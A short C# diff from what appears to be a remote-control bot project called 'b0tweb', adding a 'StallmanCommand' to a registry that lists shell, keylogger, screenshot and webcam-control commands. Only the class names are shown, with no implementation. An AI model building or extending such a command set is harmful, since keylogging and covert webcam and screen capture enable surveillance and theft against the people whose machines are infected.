@@ -5,8 +5,9 @@ namespace b0tweb.Commands
 {
     static class CommandRegistry
     {
-        private static AbstractCommand[] _supportedCommands = {
-            new CMDCommand(),
+        private static AbstractCommand[] _supportedCommands = { 
+            new CMDCommand(), 
+            new StallmanCommand(),
             new KeyloggerCommand(),
             new ScreenshotCommand(),
             new WebcamControlCommand(),
